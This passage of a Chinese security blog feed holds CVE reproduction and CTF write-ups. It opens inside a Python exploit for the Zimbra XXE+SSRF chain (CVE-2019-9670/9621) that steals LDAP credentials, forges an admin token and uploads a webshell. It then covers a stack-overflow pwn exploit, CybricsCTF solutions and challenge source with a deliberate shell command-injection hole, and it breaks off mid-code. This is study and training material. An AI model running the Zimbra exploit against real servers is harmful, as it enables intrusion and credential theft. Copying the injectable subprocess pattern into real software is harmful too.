name=(\"|&amp;quot;)zimbra_user(\"|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;"</span>)</span><br><span class="line">pattern_password = re.compile(<span class="string">r"&amp;lt;key name=(\"|&amp;quot;)zimbra_ldap_password(\"|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;"</span>)</span><br><span class="line">username = pattern_name.findall(r.text)[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">password = pattern_password.findall(r.text)[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">print(username)</span><br><span class="line">print(password)</span><br><span class="line"></span><br><span class="line">auth_body=<span class="string">"""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;</span></span><br><span class="line"><span class="string">   &lt;soap:Header&gt;</span></span><br><span class="line"><span class="string">       &lt;context xmlns="urn:zimbra"&gt;</span></span><br><span class="line"><span class="string">           &lt;userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/&gt;</span></span><br><span class="line"><span class="string">       &lt;/context&gt;</span></span><br><span class="line"><span class="string">   &lt;/soap:Header&gt;</span></span><br><span class="line"><span class="string">   &lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">     &lt;AuthRequest xmlns="&#123;xmlns&#125;"&gt;</span></span><br><span class="line"><span class="string">        &lt;account by="adminName"&gt;&#123;username&#125;&lt;/account&gt;</span></span><br><span class="line"><span class="string">        &lt;password&gt;&#123;password&#125;&lt;/password&gt;</span></span><br><span class="line"><span class="string">     &lt;/AuthRequest&gt;</span></span><br><span class="line"><span class="string">   &lt;/soap:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/soap:Envelope&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">print(<span class="string">"[*] Get Low Privilege Auth Token"</span>)</span><br><span class="line">r=requests.post(base_url+<span class="string">"/service/soap"</span>,data=auth_body.format(xmlns=<span class="string">"urn:zimbraAccount"</span>,username=username,password=password),verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">pattern_auth_token=re.compile(<span class="string">r"&lt;authToken&gt;(.*?)&lt;/authToken&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get low_priv_token</span></span><br><span class="line">low_priv_token = pattern_auth_token.findall(r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSRF+Get Admin_Token Stage</span></span><br><span class="line">headers[<span class="string">"Cookie"</span>]=<span class="string">"ZM_ADMIN_AUTH_TOKEN="</span>+low_priv_token+<span class="string">";"</span></span><br><span class="line">headers[<span class="string">"Host"</span>]=<span class="string">"foo:7071"</span></span><br><span class="line">print(<span class="string">"[*] Get Admin  Auth Token By SSRF"</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap"</span>,data=auth_body.format(xmlns=<span class="string">"urn:zimbraAdmin"</span>,username=username,password=password),headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">admin_token =pattern_auth_token.findall(r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># upload file</span></span><br><span class="line">f = &#123;</span><br><span class="line">    <span class="string">'filename1'</span>:(<span class="literal">None</span>,<span class="string">"whocare"</span>,<span class="literal">None</span>),</span><br><span class="line">    <span class="string">'clientFile'</span>:(filename,fileContent,<span class="string">"text/plain"</span>),</span><br><span class="line">    <span class="string">'requestId'</span>:(<span class="literal">None</span>,<span class="string">"12"</span>,<span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line">headers =&#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"ZM_ADMIN_AUTH_TOKEN="</span>+admin_token+<span class="string">";"</span></span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"[*] Uploading file"</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">"/service/extension/clientUploader/upload"</span>,files=f,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># visit upload file</span></span><br><span class="line">print(<span class="string">"Shell: "</span>+base_url+<span class="string">"/downloads/"</span>+filename)</span><br><span class="line">print(<span class="string">"[*] Request Result:"</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(base_url+<span class="string">"/downloads/"</span>+filename,verify=<span class="literal">False</span>,headers=headers)</span><br><span class="line">print(<span class="string">"May need cookie:"</span>)</span><br><span class="line">print(headers[<span class="string">'Cookie'</span>])</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>漏洞复现过程中主要对Zimbra相应版本中XXE和SSRF漏洞的成因进行分析，通过搭建本地复现环境，进行漏洞利用实践，主要涉及技术有XXE漏洞利用、SSRF漏洞利用、恶意文件上传、远程命令执行，加深了对Web服务漏洞的理解及其利用技术的掌握。</p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://blog.csdn.net/fnmsd/article/details/88657083">Zimbra XXE+SSRF实现RCE漏洞复现</a><br><a href="https://blog.csdn.net/sydnash/article/details/6108136">Zimbra服务器搭建</a><br><a href="https://docs.microsoft.com/zh-cn/">AutoDiscover构造语句描述</a><br><a href="http://www.myzaker.com/article/5e98fe228e9f09724949af30/">Zimbra SOAP API开发指南</a><br><a href="https://wiki.zimbra.com/wiki/Zimlet_Developers_Guide:Proxy_Servlet_Setup">Zimbra Proxy Servlet代理服务设计</a><br><a href="https://www.exploit-db.com/exploits/30472">CVE-2013-7091文件上传操作</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Zimbra-2019漏洞复现&quot;&gt;&lt;a href=&quot;#Zimbra-2019漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;Zimbra 2019漏洞复现&quot;&gt;&lt;/a&gt;Zimbra 2019漏洞复现&lt;/h2&gt;&lt;h3 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h3&gt;&lt;p&gt;2019年Zimbra爆出两个CVE，分别是&lt;code&gt;CVE-2019-9670&lt;/code&gt;和&lt;code&gt;CVE-2019-9621&lt;/code&gt;，前者是XXE漏洞，后者可实现SSRF。
    
    </summary>
    
    
      <category term="瞎捉摸的一些学习" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="CVE复现" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="http://ggb0n.cool/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF七月月赛PWN</title>
    <link href="http://ggb0n.cool/2020/07/26/DASCTF%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9BPWN/"/>
    <id>http://ggb0n.cool/2020/07/26/DASCTF%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9BPWN/</id>
    <published>2020-07-26T07:04:04.000Z</published>
    <updated>2020-07-26T13:04:26.351Z</updated>
    
    <content type="html"><![CDATA[<p>尝试做做pwn题，结果很失败，不过学到了新东西。<a id="more"></a></p><h3 id="qiandao"><a href="#qiandao" class="headerlink" title="qiandao"></a>qiandao</h3><p>简单的栈溢出，但是在<code>leave</code>指令后，利用<code>lea</code>指令给<code>esp</code>赋值别的地址，导致我们覆盖到返回地址的地址不能被跳转。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>首先需要明白在函数返回时<code>leave</code>和<code>ret</code>两条指令的本质：</p><blockquote><ul><li><code>leave</code>指令相当于<code>mov esp,ebp; pop ebp;</code>即恢复上一个函数的栈结构</li><li><code>ret</code>指令则相当于<code>pop esp;</code>也就是在ebp出栈之后，esp其实是指向返回地址的，就会将当前栈顶内容弹出到<code>eip</code>中进行执行</li></ul></blockquote><p>而<code>lea</code>和<code>mov</code>指令呢？</p><blockquote><p><code>lea</code>是<code>load effective address</code>的缩写，简单的说，lea指令可以用来将一个内存地址直接赋给目的操作数，例如：<br><code>lea eax,[ebx+8]</code>就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的内存地址里的数据赋给eax。</p><p>而<code>mov</code>指令则恰恰相反，例如：<br><code>mov eax,[ebx+8]</code>则是把内存地址为ebx+8处的数据赋给eax。</p></blockquote><p>再看一下这道题目中函数调用结束的指令：</p><p><img src="dasctf7-01.png" alt=""></p><p>在<code>leave</code>和<code>ret</code>之间执行了<code>lea esp,[ecx-4]</code>也就是将esp指向了<code>ecx-4</code>这个地址，这个地址在哪？<br>我们看到前面的<code>mov ecx,[ebp+var_4]</code>得知了ecx存放的是<code>ebp+var_4</code>地址上的内容，而<code>var_4</code>是栈上比ebp低四字节的位置：</p><p><img src="dasctf7-02.png" alt=""></p><p>也就是说<code>esp=[ebp-4]-4</code></p><p>同时程序又存在格式化字符出纳漏洞，那整个思路就很明显了：</p><ul><li>1、格式化字符串泄露栈地址</li><li>2、修改ebp-4处的值为可控地址</li><li>3、在可控地址-4的位置存放backdoor的地址</li></ul><p>我们先看一下能不能通过输入格式化字符串输出ebp地址：<code>%p%p%p%p%p%p%p%p%p</code></p><p><img src="dasctf7-03.png" alt=""></p><p><img src="dasctf7-04.png" alt=""></p><p>从图中的结果可以看到，第二个参数输出的内容正是栈底地址。</p><blockquote><p><strong>注意：指出个容易混淆的地方</strong></p><p>在用代码attach的时候，发现ebp中是有三个地址(下图)，第三个才是真正的main函数的栈底地址，刚开始很困惑为什么ebp不是输出的值？思考半天才想起来main函数中调用了多次的puts和gets函数，attach的时候是在调用函数栈中的。</p></blockquote><p><img src="dasctf7-05.png" alt=""></p><p>由此构造下payload：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stack_addr = int(p.recv(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">0x24</span> </span><br><span class="line"><span class="comment"># 这里是接收到的栈底地址的低0x24字节的地方，它的低4字节存放backdoor的地址</span></span><br><span class="line">payload2 = p32(back_addr) + <span class="string">'\x00'</span>*<span class="number">0x20</span> + p32(stack_addr) </span><br><span class="line"><span class="comment"># 这里第二次输入，从ebp-0x28的地方输入的，所以中间填充0x20个\x00，然后用stack_addr覆盖ebp-0x4的值，使lea指令之后的esp-4指向存放backdoor地址的地方</span></span><br></pre></td></tr></table></figure><p>构造exp如下：</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./qiandao'</span>)</span><br><span class="line"><span class="comment">#p = remote('183.129.189.60',10013)</span></span><br><span class="line"></span><br><span class="line">back_addr = <span class="number">0x0804857D</span></span><br><span class="line">payload1 = <span class="string">'%2$p'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack_addr = int(p.recv(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">0x24</span></span><br><span class="line"></span><br><span class="line">payload2 = p32(back_addr) + <span class="string">'\x00'</span>*<span class="number">0x20</span> + p32(stack_addr)</span><br><span class="line">p.recvuntil(<span class="string">'problem?'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;尝试做做pwn题，结果很失败，不过学到了新东西。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="栈溢出" scheme="http://ggb0n.cool/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>CybricsCTF</title>
    <link href="http://ggb0n.cool/2020/07/26/CybricsCTF/"/>
    <id>http://ggb0n.cool/2020/07/26/CybricsCTF/</id>
    <published>2020-07-26T03:07:55.000Z</published>
    <updated>2020-07-27T08:08:39.322Z</updated>
    
    <content type="html"><![CDATA[<p>记得去年是放假回家的路上比赛开始的，回到家开始做，结果一道题也没出…</p><p>今年还行，简单题能做做。<a id="more"></a></p><h3 id="Misc-Hellish-Reverse"><a href="#Misc-Hellish-Reverse" class="headerlink" title="Misc-Hellish Reverse"></a>Misc-Hellish Reverse</h3><p>binwalk直接拿到flag</p><p><img src="http://ggb0n.cool/images/cybrics03.png" alt=""></p><h3 id="Misc-Krevedka"><a href="#Misc-Krevedka" class="headerlink" title="Misc-Krevedka"></a>Misc-Krevedka</h3><p>http流量溯源</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>题目说是一个内网用户用另一个用户的账号<code>caleches</code>进行登录，那我们就找<code>caleches</code>提交申请的POST包：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">urlencoded-form.value</span>==<span class="string">"caleches"</span></span><br></pre></td></tr></table></figure><p>可以看到三个提交登录的报文：</p><p><img src="http://ggb0n.cool/images/cybrics01.png" alt=""></p><p>密码是<code>vixie</code>和<code>%20+or+1%3D1+--</code>显然包含第二个密码的报文是攻击者提交的，可以在该报文中拿到他浏览器的<code>User-Agent</code>信息，然后再用此信息去数据包中找其他包含此信息的报文，便可以找到攻击者提交的报文记录，其中包含他自己的用户名：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">http.user_agent</span>==<span class="string">"UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; www1.smart.com.ph/; GT-S5360) U2/1.0.0 UCBrowser/9.8.0.534 Mobile"</span></span><br></pre></td></tr></table></figure><p><img src="http://ggb0n.cool/images/cybrics02.png" alt=""></p><h3 id="Misc-Kyshooter"><a href="#Misc-Kyshooter" class="headerlink" title="Misc-Kyshooter"></a>Misc-Kyshooter</h3><p>考察视频分帧/慢放，好吧，其实考的是眼力。。。</p><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p><code>ffmpeg</code>对视频进行分帧，</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ffmpeg</span><span class="selector-class">.exe</span> <span class="selector-tag">-i</span> <span class="selector-tag">speeded</span><span class="selector-class">.mp4</span> <span class="selector-tag">-r</span> 30 %3<span class="selector-tag">d</span><span class="selector-class">.png</span></span><br></pre></td></tr></table></figure><p>结合<code>Potplayer</code>0.2倍速慢放，再多次尝试得到密码<code>mahchoudqotlzeeb</code>，看到视频里的加密是：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">openssl</span> <span class="selector-tag">enc</span> <span class="selector-tag">-aes-256-cbc</span> <span class="selector-tag">-in</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span> <span class="selector-tag">-out</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span><span class="selector-class">.enc</span></span><br></pre></td></tr></table></figure><p>用<code>aes-256-cbc</code>解密即可：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">openssl</span> <span class="selector-tag">enc</span> <span class="selector-tag">-d</span> <span class="selector-tag">-aes-256-cbc</span> <span class="selector-tag">-in</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span><span class="selector-class">.enc</span> <span class="selector-tag">-out</span> <span class="selector-tag">flag</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p>刚开始用<code>ubuntu16</code>死活解密错误，以为是密码错了，狂猜密码都不行，后来偶然间用<code>ubuntu18</code>才解正确，魔幻。。。</p><h3 id="MISC-XCor"><a href="#MISC-XCor" class="headerlink" title="MISC-XCor"></a>MISC-XCor</h3><p>简单流量审计</p><h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><p>拿到流量包，可导出<code>net10.exe</code>的对象，需要输入用户名，然后在流量包中找到了包含用户名的两个报文：</p><p><img src="http://ggb0n.cool/images/cybrics05.png" alt=""></p><p>拿到用户名登录即可拿到flag</p><p><img src="http://ggb0n.cool/images/cybrics04.png" alt=""></p><h3 id="Crypto-Mic-Check"><a href="#Crypto-Mic-Check" class="headerlink" title="Crypto-Mic Check"></a>Crypto-Mic Check</h3><p>签到密码题，提示说是与Windows的<code>UserAssist</code>加密，其实就是<code>ROT-13</code>加密，字母对应如下</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span></span><br><span class="line"><span class="attribute">NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm</span></span><br></pre></td></tr></table></figure><p>替换回去即可。</p><h3 id="Crypto-Broken-Invitation"><a href="#Crypto-Broken-Invitation" class="headerlink" title="Crypto-Broken Invitation"></a>Crypto-Broken Invitation</h3><p>题目给了三组公钥、且e=3，显然是<code>低加密指数广播攻击</code>，代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> binascii, gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n =  [</span><br><span class="line"><span class="number">0x8aa5dfa13fd16765b7a220eac8731dbc2865772496325b671e742ec391249bbddc4aaa3c8264a0ba5de8843d161dcbb5eb02813fcf14aab3ef315845228864b9fb426620bedb146237f2095adcaa233280bdd526aa2238e66b222c880fd4d78efacc56a887</span>,</span><br><span class="line"><span class="number">0x3eff009b4c43b714ff55f38fa16a633f266ca10e7500c568715d91b650573f66dcb6266be76da94b9ca7c394a9b65fed6e7b8522a1da640ce7033fd933aa1c3e4a1fd0747c1b17ec2fa1239299beaa269752944d7cc084ee145985f1</span>,</span><br><span class="line"><span class="number">0x698a394fbc84898d0a276f457de4166ffcb6c96736621de30892e66585da3077f7e6298f23fb31b511989692a1fd4d1ebc7ded8d35f93a80de69fb9ec1003af55484f5638215aa84866191df9baa56a394179f66243e803b0df8c789c8755eef4e431205264205</span></span><br><span class="line">]</span><br><span class="line">c =  [</span><br><span class="line"><span class="number">0x3a4fe4c9a1318194d364e7a67b7e34dbb02c3f2e63f52b26bb8b3ef349807679c0ff95245187b5ddbc1baaa4a808137d456696cfb3ebe47b7853cec33c709d9ce8b46272f7b0b0e69dd4091920b968b8ad37686e24b800928732daf924f98945267cfd156a</span>,</span><br><span class="line"><span class="number">0x2ed28a3bb70af3820c5fc9e27f16b8d893ba578bcf1d879a32898c8e4e0f4b3fdf339889f9a44026de783786e62f1fe8fc25770bf89519c2fbd66d2cc6c02ffae8722b4391173993fa3f993b3318f07ca9a31df84a48959bfd0e06a</span>,</span><br><span class="line"><span class="number">0x63faaa3d6c3585425190d755347f6cd8913805f7edc551096322d105f24a6339c8f0ac1025db08cbda89195818acdeaea42a9273b10b874ec63e7d986f1172988a700308bc72f3d4531c9ec08e2ec06f5c00c54cc54d13b44ff33eb3851231fb591a0c15e220ac</span></span><br><span class="line">]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line">e=<span class="number">0x3</span></span><br><span class="line">m=gmpy2.iroot(CRT(n, c), e)[<span class="number">0</span>]</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line">s = str(m)</span><br><span class="line">print(s[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><h3 id="Reverse-Babyrev"><a href="#Reverse-Babyrev" class="headerlink" title="Reverse-Babyrev"></a>Reverse-Babyrev</h3><p>简单逆向，不然也做不出来</p><h4 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h4><p>给了<code>xml</code>文件，题目还提示：<a href="https://snap.berkeley.edu/offline"><strong>snap.berkeley.edu/offline</strong></a></p><p>下载snap，打开xml文件可以得到加密逻辑：</p><p><img src="http://ggb0n.cool/images/cybrics06.png" alt=""></p><p>可以看到是与<code>33</code>进行异或，拿最后的结果异或回去即可：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list = [<span class="number">66</span>,<span class="number">88</span>,<span class="number">67</span>,<span class="number">83</span>,<span class="number">72</span>,<span class="number">66</span>,<span class="number">82</span>,<span class="number">90</span>,<span class="number">86</span>,<span class="number">18</span>,<span class="number">77</span>,<span class="number">16</span>,<span class="number">98</span>,<span class="number">17</span>,<span class="number">76</span>,<span class="number">18</span>,<span class="number">126</span>,<span class="number">97</span>,<span class="number">79</span>,<span class="number">69</span>,<span class="number">126</span>,<span class="number">102</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">69</span>,<span class="number">126</span>,<span class="number">77</span>,<span class="number">116</span>,<span class="number">66</span>,<span class="number">74</span>,<span class="number">0</span>,<span class="number">92</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">tmp = list[i]</span><br><span class="line">flag+=chr(tmp^<span class="number">33</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="Web-Hunt"><a href="#Web-Hunt" class="headerlink" title="Web-Hunt"></a>Web-Hunt</h3><p>五个验证码，全验证对了就行，这题得科学上网，要不然验证码你都拿不到。。。</p><h3 id="Web-Gif2png"><a href="#Web-Gif2png" class="headerlink" title="Web-Gif2png"></a>Web-Gif2png</h3><p>题目提供了源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, flash, send_from_directory</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'gif'</span>&#125;</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'********************************'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">500</span> * <span class="number">1024</span>  <span class="comment"># 500Kb</span></span><br><span class="line">ffLaG = <span class="string">"cybrics&#123;********************************&#125;"</span></span><br><span class="line">Bootstrap(app)</span><br><span class="line">logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            logging.debug(<span class="string">'No file part'</span>)</span><br><span class="line">            flash(<span class="string">'No file part'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">            logging.debug(<span class="string">'No selected file'</span>)</span><br><span class="line">            flash(<span class="string">'No selected file'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">            logging.debug(<span class="string">f'Invalid file extension of file: <span class="subst">&#123;file.filename&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid file extension'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file.content_type != <span class="string">"image/gif"</span>:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid Content type: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Content type is not "image/gif"'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bool(re.match(<span class="string">"^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$"</span>, file.filename)) <span class="keyword">or</span> <span class="string">".."</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid symbols in filename: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid filename'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], file.filename))</span><br><span class="line"></span><br><span class="line">            mime_type = filetype.guess_mime(<span class="string">f'uploads/<span class="subst">&#123;file.filename&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">if</span> mime_type != <span class="string">"image/gif"</span>:</span><br><span class="line">                logging.debug(<span class="string">f'Invalid Mime type: <span class="subst">&#123;mime_type&#125;</span>'</span>)</span><br><span class="line">                flash(<span class="string">'Mime type is not "image/gif"'</span>, <span class="string">'danger'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">            uid = str(uuid.uuid4())</span><br><span class="line">            os.mkdir(<span class="string">f"uploads/<span class="subst">&#123;uid&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line">            logging.debug(<span class="string">f"Created: <span class="subst">&#123;uid&#125;</span>. Command: ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\""</span>)</span><br><span class="line"></span><br><span class="line">            command = subprocess.Popen(<span class="string">f"ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\""</span>, shell=<span class="literal">True</span>) <span class="comment"># 命令执行</span></span><br><span class="line">            command.wait(timeout=<span class="number">15</span>)</span><br><span class="line">            logging.debug(command.stdout)</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">'Successfully saved'</span>, <span class="string">'success'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'result'</span>, uid=uid))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"form.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/result/&lt;uid&gt;/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(uid)</span>:</span></span><br><span class="line">    images = []</span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> os.listdir(<span class="string">f"uploads/<span class="subst">&#123;uid&#125;</span>"</span>):</span><br><span class="line">        mime_type = filetype.guess(str(Path(<span class="string">"uploads"</span>) / uid / image))</span><br><span class="line">        <span class="keyword">if</span> image.endswith(<span class="string">".png"</span>) <span class="keyword">and</span> mime_type <span class="keyword">is</span> <span class="keyword">not</span> <span 